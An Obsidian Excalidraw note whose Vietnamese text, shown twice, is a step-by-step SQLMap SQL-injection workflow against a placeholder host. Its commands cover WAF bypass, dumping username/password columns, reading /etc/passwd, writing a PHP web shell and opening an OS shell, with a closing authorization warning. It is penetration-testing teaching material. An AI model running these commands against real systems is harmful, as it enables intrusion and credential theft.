---

excalidraw-plugin: parsed
tags: [excalidraw]

---
==⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠== You can decompress Drawing data with the command palette: 'Decompress current Excalidraw file'. For more info check in plugin settings under 'Saving'
# note

Dưới đây là **workflow chuẩn** khi sử dụng SQLMap để kiểm thử SQL injection, từ lúc bắt đầu cho đến khi khai thác dữ liệu (nếu có).

---

## 🔍 Workflow SQLMap chuẩn

### Bước 1: Xác định mục tiêu và thu thập thông tin

- Xác định URL hoặc request có chứa tham số có thể bị SQL injection.
- Nếu có form đăng nhập, tìm kiếm, hoặc tham số trên URL (GET) hoặc trong body (POST).
- Thu thập các header, cookie cần thiết (phiên đăng nhập, CSRF token...).
- Dùng công cụ như **Burp Suite** để bắt request và lưu thành file `.txt` (nếu cần).

### Bước 2: Kiểm tra nhanh khả năng injection (thủ công hoặc bằng SQLMap)

- Dùng SQLMap với cấu hình cơ bản để phát hiện nhanh:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch
  ```
- Nếu có request phức tạp, lưu request vào file và dùng:
  ```bash
  sqlmap -r request.txt --batch
  ```

- Quan sát kết quả: SQLMap sẽ báo có injection hay không, loại injection (boolean, error, time-based, union...).

### Bước 3: Xác định loại DBMS và cấu hình nâng cao (nếu cần)

- Nếu SQLMap không tự nhận diện được DBMS, chỉ định:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
  ```
- Nếu gặp tường lửa (WAF), thử dùng `--tamper`:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase --batch
  ```
- Tăng mức kiểm tra nếu cần:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
  ```

### Bước 4: Lấy thông tin cơ bản về database

- Lấy banner (phiên bản DBMS):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --banner --batch
  ```
- Lấy user hiện tại và quyền:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --current-user --privileges --batch
  ```
- Lấy danh sách databases:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
  ```

### Bước 5: Chọn database và khai thác dữ liệu

- Chọn database cần khai thác (ví dụ: `users_db`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db --tables --batch
  ```
- Lấy danh sách cột của bảng quan tâm (ví dụ: `users`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --columns --batch
  ```
- Trích xuất dữ liệu từ các cột cụ thể (ví dụ: `username, password`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users -C username,password --dump --batch
  ```

### Bước 6: Tùy chọn nâng cao (nếu được phép)

- **Đọc file hệ thống:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
  ```
- **Ghi file lên server (thường để tạo shell):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
  ```
- **Lấy OS shell:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
  ```

### Bước 7: Lưu phiên và báo cáo

- Lưu lại session để tiếp tục sau này:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
  ```
- Resume phiên đã lưu:
  ```bash
  sqlmap --resume=sqlmap_session.sqlite
  ```
- Xuất kết quả ra file (CSV, HTML):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --dump --batch --csv=output.csv
  ```

---

## ⚠️ Lưu ý quan trọng

- **Chỉ thực hiện trên hệ thống bạn có quyền kiểm tra.** Tấn công trái phép là vi phạm pháp luật.
- Luôn có sự cho phép bằng văn bản trước khi pentest.
- Theo dõi tốc độ request để tránh gây quá tải hoặc bị chặn (dùng `--delay`, `--threads` hợp lý).
- Nếu gặp khó khăn, hãy tăng mức verbosity (`-v 3`) để xem chi tiết request/response.
- Sử dụng proxy (Burp) khi cần phân tích sâu hơn:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
  ```

---

Hy vọng workflow trên giúp bạn thực hiện kiểm thử SQL injection một cách bài bản và hiệu quả.# Markdown Images

<!-- excalidraw-markdown-image:63133756e83bfdded55d6408077bdc911fc4f426 -->

Dưới đây là **workflow chuẩn** khi sử dụng SQLMap để kiểm thử SQL injection, từ lúc bắt đầu cho đến khi khai thác dữ liệu (nếu có).

---

## 🔍 Workflow SQLMap chuẩn

### Bước 1: Xác định mục tiêu và thu thập thông tin

- Xác định URL hoặc request có chứa tham số có thể bị SQL injection.
- Nếu có form đăng nhập, tìm kiếm, hoặc tham số trên URL (GET) hoặc trong body (POST).
- Thu thập các header, cookie cần thiết (phiên đăng nhập, CSRF token...).
- Dùng công cụ như **Burp Suite** để bắt request và lưu thành file `.txt` (nếu cần).

### Bước 2: Kiểm tra nhanh khả năng injection (thủ công hoặc bằng SQLMap)

- Dùng SQLMap với cấu hình cơ bản để phát hiện nhanh:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch
  ```
- Nếu có request phức tạp, lưu request vào file và dùng:
  ```bash
  sqlmap -r request.txt --batch
  ```

- Quan sát kết quả: SQLMap sẽ báo có injection hay không, loại injection (boolean, error, time-based, union...).

### Bước 3: Xác định loại DBMS và cấu hình nâng cao (nếu cần)

- Nếu SQLMap không tự nhận diện được DBMS, chỉ định:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
  ```
- Nếu gặp tường lửa (WAF), thử dùng `--tamper`:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase --batch
  ```
- Tăng mức kiểm tra nếu cần:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
  ```

### Bước 4: Lấy thông tin cơ bản về database

- Lấy banner (phiên bản DBMS):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --banner --batch
  ```
- Lấy user hiện tại và quyền:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --current-user --privileges --batch
  ```
- Lấy danh sách databases:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
  ```

### Bước 5: Chọn database và khai thác dữ liệu

- Chọn database cần khai thác (ví dụ: `users_db`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db --tables --batch
  ```
- Lấy danh sách cột của bảng quan tâm (ví dụ: `users`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --columns --batch
  ```
- Trích xuất dữ liệu từ các cột cụ thể (ví dụ: `username, password`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users -C username,password --dump --batch
  ```

### Bước 6: Tùy chọn nâng cao (nếu được phép)

- **Đọc file hệ thống:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
  ```
- **Ghi file lên server (thường để tạo shell):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
  ```
- **Lấy OS shell:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
  ```

### Bước 7: Lưu phiên và báo cáo

- Lưu lại session để tiếp tục sau này:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
  ```
- Resume phiên đã lưu:
  ```bash
  sqlmap --resume=sqlmap_session.sqlite
  ```
- Xuất kết quả ra file (CSV, HTML):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --dump --batch --csv=output.csv
  ```

---

## ⚠️ Lưu ý quan trọng

- **Chỉ thực hiện trên hệ thống bạn có quyền kiểm tra.** Tấn công trái phép là vi phạm pháp luật.
- Luôn có sự cho phép bằng văn bản trước khi pentest.
- Theo dõi tốc độ request để tránh gây quá tải hoặc bị chặn (dùng `--delay`, `--threads` hợp lý).
- Nếu gặp khó khăn, hãy tăng mức verbosity (`-v 3`) để xem chi tiết request/response.
- Sử dụng proxy (Burp) khi cần phân tích sâu hơn:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
  ```

---

Hy vọng workflow trên giúp bạn thực hiện kiểm thử SQL injection một cách bài bản và hiệu quả.

<!-- /excalidraw-markdown-image:63133756e83bfdded55d6408077bdc911fc4f426 -->

# Excalidraw Data

## Text Elements
## Element Links
eWaS53M2: [[Tools/workflow sql map.md#note]]

## Embedded Files
63133756e83bfdded55d6408077bdc911fc4f426: markdown-image

%%
## Drawing
```compressed-json
N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebR4ANm0AFho6IIR9BA4oZm4AbXAwUDBSiBJuCABGADVBAEEABgoAVjTSyFhESsJ9aKR+MsxuAGYqgE5tRvGqgA555J4AdiWR

5OSRwcgYbgSWlu1xpcbGqoTkpfHk8Z4+IsgKEnVucdmq7SXk2b23lvmlqrJLZSBCEZTSbg8aYHN7jcYJKotC6zFpnYHWZTBbiNYHMKCkNgAawQAGE2Pg2KRKgBiE50xrtMqaXDYQnKAlCDjEMkUqkSfHWZhwXCBHKMyAAM0I+HwAGVYFiJJIWRpAuKIHiCcSAOpPSTcKq4/FEhDymCK9CCDzqjngjjhPJoQ33CBsYXYNQ7J0nYEcrn25iO1AcIQy

3EIBDESE/cbAxgsdhcNAjK5xpisTgAOU4YgNSxaq1mI3OmxdQjgxFwUEjefmpzhjRWUOBhGYABEMtWo2gJQQwsD2cI4ABJYhB/IAXWBmmEXIAosEsjlx1OXUQOITuCGw2u2Kya2h8UIEMCJeQsqOt6H8MDlcwACpYKAAGUIG+4vfw/ZdUuCl4kCRjCMIz5gkCBFpoErEMQkb7MQ5yNLMjZLJoxDYDMVQStgyQSosCTqsw7jiKghQdGAzpkVU9yrh

0EDYAScBXjutHYEIeIGG2Va4NwJS0X0pCEsQbAUBww59MoxG8bRhGSJkuA1OmiYGlsZTxhmSaoICKkCMIojERAFLuOKZSijBfKoFJtGPMQzxOoiOL3LRwrQW+ygAEJsDIBgGg5ZFlBKnBQAAYrg+jSl66AkqEeCONx2mSoFPKUpUbn4Cym7xRAM6kGZPGObR2S4JowTdqgn7fn5ZR6LyKVpayED5WAAC+mXYIGlTGWUAocIRvjqXllWQIVxUHmVf

Yno1CU5CFYX4BFEBRYRuCxZ1/mJeSyUSKl6WrZA2W5WgllkRgHBFSVH7jfFVUbeZEDbfVk0tZNdHtRIDWVU1+WfWRT3HUJ2ZQMOHDxlAso1AA4kDnECQAsmwMEXV+CD3L9ZRvjBwwSLgDJGlWbGVIgXKue9zWDFJ5SlRg2q4LKLQjDDPDql0+mZJokaViN6qY6gLQ8MkHwJIhVwrHT4yNAkwIRc4SLaMWPAtI0IyNKi+ZLG8wLWbZqB7EkqLAQkB

twjwcwSy6slghCaAK75ZQYhaNsCMaxJJbdtL0jjLrMqyg6ctyN2VN1QoitkUDqr+coKvpyrYKqAwupqJq6jZ+pOkaWqmpHlRWhUvrCHaDrKS6bosp6PkOxAfrEAGQbbje8cRqVxtXECLpqUpTojC0aYJlmObEYCazzOcxvAuWlZdrWSETEW8xIi27adqN5UTbRPsjmOBQ0Uys7EAumQhyuwLrpuEj5Pk95sOSEQUJShIShSFCoMwACO+CoH0cDaP

oxDUhwnkIBOCc6pDLElKsvU854ED/mDNeW8oRHyYBfG+E+Y0ka4iIgURyFEOhUQ6FvSArF2L6E4lEAafFiAAAUGJBiOhANiCAADy9gSBOA7L2UMuREYVWOl7NklcYZVhjlFYGoQuErx4elH2XIBFQBjnvJcodDykGPNpLKkjK4uxpBKbRnU1He0rgw90pc0AO23jlJgMi5GLhDtwI84jaL7SYJoiQ1JtESl0Y40ghiS6wGxKo38hUsg1FbIQTmPZ

Lr5QMnuUBAAlEIjgODKDhgjcJSNHLfVKKjSA6MsCVFwFUEm30aIQFwHAOA8oqySSKNAWSWRKhEHBKHQYDBCAIAoG5dRO9nHoFcW4nRzTWKkFFIDas+h5Tp26RAakVQEAzJmYyOiIhhnDlGR0/RXT/b8nID1YUwyFmDOWaMoK0oI7mn0tnKMAylkhxWZkcZic9QAGkEDzSyI4IQ+h9nXJyLcsZTsEA1BFFYTQ0pjHoD0D1KIYorlDJuaM+5xIzQWg

1OSHO1SDlwsyDEvOkhq6Fyqt8kZmRvEel8d6G2izYU/KOYFGa4VuBd3RYS35QVAqykIEYYizYmVUqJfoBBUB6gNI0gZBAEomk8sOXcqIpBBVDOErJZaTE64Et5b8ucXJ6jyooIqymIoCRUBhVK/QWqDX3ngPpSuXy1VHMgdii0tdmmEQJDKAAGtwZwPAkLaBaDrQsXqqjyydfRck+AACaHqqhK1mD6+ECJvi8zWCMWYzSjCX0+YdVuBBjwGiKKjS

lxrsW+zxRIK1zT2QkHZZy5V5bSCVurIxK2taSDJIQBqs6S8IllArX7GqmbaIeXwJTUgyhmQAApjZLGoLwKoU6Z1zsaD6gAlOqOJyhQwikqCO8dPAlbTt3TiXge7UCLpaCuvNRqQ4IsYXAKAiYa6wOqWeUKCA4lciYMTftZRhrnSUSol02AiCNtQHY4Ep06l/vsa6IQUB1zEVAy6fixJSCZhfbY5RUGkNMHbSNUqdiL3VLsAAKwQNgXIspTpwFbTh

39qDuElLI4QRgF9yRkM6BayoyouTqkIVAAw5ruhoEdbufcYCu3+QJGMjIjHOBiKPqEQVjHmOX3wMqgjZRHDMA7WSHIT4YbZCEHJ6pIKiaJKoWKpg2RcwSB/TWZprY3Lo1cjR0aCG0bMBhiQOAbA3yg0o3AZzp1cPof/dvTAsppN3s4K2yoEKohvner9CAASaGfSakAA=
```
%%